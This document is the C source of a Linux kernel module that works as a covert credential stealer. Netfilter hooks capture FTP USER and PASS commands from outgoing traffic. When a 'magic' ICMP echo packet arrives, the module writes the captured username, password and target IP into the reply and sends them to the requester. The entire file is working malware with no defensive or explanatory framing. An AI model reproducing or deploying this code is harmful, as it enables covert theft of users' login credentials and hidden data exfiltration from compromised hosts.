#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>

#define MAGIC_CODE   0x5B
#define REPLY_SIZE   36

MODULE_LICENSE("GPL");

#define ICMP_PAYLOAD_SIZE  (htons(ip_hdr(sb)->tot_len) \
			       - sizeof(struct iphdr) \
			       - sizeof(struct icmphdr))

/* THESE values are used to keep the USERname and PASSword until
 * they are queried. Only one USER/PASS pair will be held at one
 * time and will be cleared once queried. */
static char *username = NULL;
static char *password = NULL;
static int  have_pair = 0;	 /* Marks if we already have a pair */

/* Tracking information. Only log USER and PASS commands that go to the
 * same IP address and TCP port. */
static unsigned int target_ip = 0;
static unsigned short target_port = 0;

/* Used to describe our Netfilter hooks */
struct nf_hook_ops  pre_hook;	       /* Incoming */
struct nf_hook_ops  post_hook;	       /* Outgoing */


/* Function that looks at an sk_buff that is known to be an FTP packet.
 * Looks for the USER and PASS fields and makes sure they both come from
 * the one host as indicated in the target_xxx fields */
static void check_ftp(struct sk_buff *skb)
{
   struct tcphdr *tcp;
   char *data;
   int len = 0;
   int i = 0;
   
   tcp = (struct tcphdr *)(skb->data + (ip_hdr(skb)->ihl * 4));
   data = (char *)((int)tcp + (int)(tcp->doff * 4));

   /* Now, if we have a username already, then we have a target_ip.
    * Make sure that this packet is destined for the same host. */
   if (username)
     if (ip_hdr(skb)->daddr != target_ip || tcp->source != target_port)
       return;
   
   /* Now try to see if this is a USER or PASS packet */
   if (strncmp(data, "USER ", 5) == 0) {          /* Username */
      data += 5;
      
      if (username)  return;
      
      while (*(data + i) != '\r' && *(data + i) != '\n'
	     && *(data + i) != '\0' && i < 15) {
	 len++;
	 i++;
      }
      
      if ((username = kmalloc(len + 2, GFP_KERNEL)) == NULL)
	return;
      memset(username, 0x00, len + 2);
      memcpy(username, data, len);
      *(username + len) = '\0';	       /* NULL terminate */
   } else if (strncmp(data, "PASS ", 5) == 0) {   /* Password */
      data += 5;

      /* If a username hasn't been logged yet then don't try logging
       * a password */
      if (username == NULL) return;
      if (password)  return;
      
      while (*(data + i) != '\r' && *(data + i) != '\n'
	     && *(data + i) != '\0' && i < 15) {
	 len++;
	 i++;
      }

      if ((password = kmalloc(len + 2, GFP_KERNEL)) == NULL)
	return;
      memset(password, 0x00, len + 2);
      memcpy(password, data, len);
      *(password + len) = '\0';	       /* NULL terminate */
   } else if (strncmp(data, "QUIT", 4) == 0) {
      /* Quit command received. If we have a username but no password,
       * clear the username and reset everything */
      if (have_pair)  return;
      if (username && !password) {
	 kfree(username);
	 username = NULL;
	 target_port = target_ip = 0;
	 have_pair = 0;
	 
	 return;
      }
   } else {
      return;
   }

   if (!target_ip)
     target_ip = ip_hdr(skb)->daddr;
   if (!target_port)
     target_port = tcp->source;

   if (username && password)
     have_pair++;		       /* Have a pair. Ignore others until
					* this pair has been read. */
   if (have_pair)
     printk("Have password pair!  U: %s   P: %s\n", username, password);
}

/* Function called as the POST_ROUTING (last) hook. It will check for
 * FTP traffic then search that traffic for USER and PASS commands. */
static unsigned int watch_out(unsigned int hooknum,
			      struct sk_buff *skb,
			      const struct net_device *in,
			      const struct net_device *out,
			      int (*okfn)(struct sk_buff *))
{
   struct sk_buff *sb = skb;
   struct tcphdr *tcp;
   
   /* Make sure this is a TCP packet first */
   if (ip_hdr(sb)->protocol != IPPROTO_TCP)
     return NF_ACCEPT;		       /* Nope, not TCP */
   
   tcp = (struct tcphdr *)((sb->data) + (ip_hdr(sb)->ihl * 4));
   
   /* Now check to see if it's an FTP packet */
   if (tcp->dest != htons(21))
     return NF_ACCEPT;		       /* Nope, not FTP */
   
   /* Parse the FTP packet for relevant information if we don't already
    * have a username and password pair. */
   if (!have_pair)
     check_ftp(sb);
   
   /* We are finished with the packet, let it go on its way */
   return NF_ACCEPT;
}


/* Procedure that watches incoming ICMP traffic for the "Magic" packet.
 * When that is received, we tweak the skb structure to send a reply
 * back to the requesting host and tell Netfilter that we stole the
 * packet. */
static unsigned int watch_in(unsigned int hooknum,
			     struct sk_buff *skb,
			     const struct net_device *in,
			     const struct net_device *out,
			     int (*okfn)(struct sk_buff *))
{
   struct sk_buff *sb = skb;
   struct icmphdr *icmp;
   char *cp_data;		       /* Where we copy data to in reply */
   unsigned int   taddr;	       /* Temporary IP holder */

   /* Do we even have a username/password pair to report yet? */
   if (!have_pair)
     return NF_ACCEPT;
     
   /* Is this an ICMP packet? */
   if (ip_hdr(sb)->protocol != IPPROTO_ICMP)
     return NF_ACCEPT;
   
   icmp = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl * 4);

   /* Is it the MAGIC packet? */
   if (icmp->code != MAGIC_CODE || icmp->type != ICMP_ECHO
     || ICMP_PAYLOAD_SIZE < REPLY_SIZE) {
      return NF_ACCEPT;
   }
   
   /* Okay, matches our checks for "Magicness", now we fiddle with
    * the sk_buff to insert the IP address, and username/password pair,
    * swap IP source and destination addresses and ethernet addresses
    * if necessary and then transmit the packet from here and tell
    * Netfilter we stole it. Phew... */
   taddr = ip_hdr(sb)->saddr;
   ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
   ip_hdr(sb)->daddr = taddr;

   sb->pkt_type = PACKET_OUTGOING;

   switch (sb->dev->type) {
    case ARPHRD_PPP:		       /* Ntcho iddling needs doing */
      break;
    case ARPHRD_LOOPBACK:
    case ARPHRD_ETHER:
	{
	   unsigned char t_hwaddr[ETH_ALEN];
	   
	   /* Move the data pointer to point to the link layer header */
	   sb->data = (unsigned char *)eth_hdr(sb);
	   sb->len += ETH_HLEN; //sizeof(sb->mac.ethernet);
	   memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
	   memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),
		  ETH_ALEN);
	   memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
 	   break;
	}
   };
 
   /* Now copy the IP address, then Username, then password into packet */
   cp_data = (char *)((char *)icmp + sizeof(struct icmphdr));
   memcpy(cp_data, &target_ip, 4);
   if (username)
     //memcpy(cp_data + 4, username, 16);
     memcpy(cp_data + 4, username, 16);
   if (password)
     memcpy(cp_data + 20, password, 16);
   
   /* This is where things will die if they are going to.
    * Fingers crossed... */
   dev_queue_xmit(sb);

   /* Now free the saved username and password and reset have_pair */
   kfree(username);
   kfree(password);
   username = password = NULL;
   have_pair = 0;
   
   target_port = target_ip = 0;

//   printk("Password retrieved\n");
   
   return NF_STOLEN;
}

int init_module()
{
   pre_hook.hook     = watch_in;
   pre_hook.pf       = PF_INET;
   pre_hook.priority = NF_IP_PRI_FIRST;
   pre_hook.hooknum  = NF_INET_PRE_ROUTING;
   
   post_hook.hook     = watch_out;
   post_hook.pf       = PF_INET;
   post_hook.priority = NF_IP_PRI_FIRST;
   post_hook.hooknum  = NF_INET_POST_ROUTING;
   
   nf_register_hook(&pre_hook);
   nf_register_hook(&post_hook);
   
   return 0;
}

void cleanup_module()
{
   nf_unregister_hook(&post_hook);
   nf_unregister_hook(&pre_hook);
   
   if (password)
     kfree(password);
   if (username)
     kfree(username);
}

